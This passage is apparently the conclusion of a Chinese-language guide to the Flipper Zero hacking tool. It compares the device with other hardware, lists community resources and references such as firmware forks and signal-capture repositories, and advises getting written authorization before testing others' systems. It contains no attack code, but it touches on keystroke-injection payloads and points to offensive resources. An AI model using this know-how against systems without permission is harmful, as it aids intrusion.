Flipper Zero 的优势在于覆盖面广，不在于任何单一类别的深度。进行深入 RFID/NFC 工作时，Proxmark3 更出色。进行完整 SDR 工作时，HackRF 或 USRP 的能力强得多。进行 802.11 攻击时，WiFi Pineapple 是更合适的平台。当你不知道会遇到什么时，Flipper Zero 是随身携带的工具。

## 社区资源

| 资源 | URL | 内容 |
|----------|-----|-----------|
| **官方文档** | docs.flipper.net | 固件 API 和硬件规格 |
| **官方 GitHub** | github.com/flipperdevices | 固件源码和问题跟踪器 |
| **Unleashed GitHub** | github.com/DarkFlippers/unleashed-firmware | Unleashed 分支 |
| **Xtreme GitHub** | github.com/Flipper-XFW/Xtreme-Firmware | Xtreme 分支 |
| **flipc.org** | flipc.org | 社区信号数据库 |
| **UberGuidoZ 仓库** | github.com/UberGuidoZ/Flipper | Sub-GHz 捕获数据和红外数据库 |
| **awesome-flipperzero** | github.com/djsime1/awesome-flipperzero | 精选资源列表 |
| **r/flipperzero** | reddit.com/r/flipperzero | 社区问答 |
| **Flipper Discord** | discord.gg/flipperzero | 实时社区支持 |

---

你投入得越深入，Flipper Zero 能带来的回报就越大。开箱体验对新手很友好：读取一张卡、捕获遥控器信号、输入键盘记录器负载。而一旦掌握固件内部机制、GPIO 扩展生态和社区应用目录，它就能成为物理安全、嵌入式安全或无线研究从业者长期使用的工具。

读取自己的卡片，测试自己的系统；测试他人的系统前，先取得书面授权。

## 参考资料

- [Flipper Zero 官方网站](https://flipperzero.one/)
- [Flipper Zero 官方 GitHub 仓库](https://github.com/flipperdevices/flipperzero-firmware)
- [Flipper Zero 文档](https://docs.flipper.net/)
- [Unleashed 固件](https://github.com/DarkFlippers/unleashed-firmware)
- [Xtreme 固件](https://github.com/Flipper-XFW/Xtreme-Firmware)
- [UberGuidoZ Flipper 资源](https://github.com/UberGuidoZ/Flipper)
- [flipc.org 社区数据库](https://flipc.org/)
- [awesome-flipperzero（Flipper Zero 精选资源）](https://github.com/djsime1/awesome-flipperzero)
- [CC1101 数据手册 — Texas Instruments](https://www.ti.com/product/CC1101)
- [ST25R3916B 数据手册 — STMicroelectronics](https://www.st.com/en/nfc/st25r3916b.html)
- [硬件黑客必备工具与技术](https://simeononsecurity.com/articles/hardware-hacker-essential-tools-techniques/)
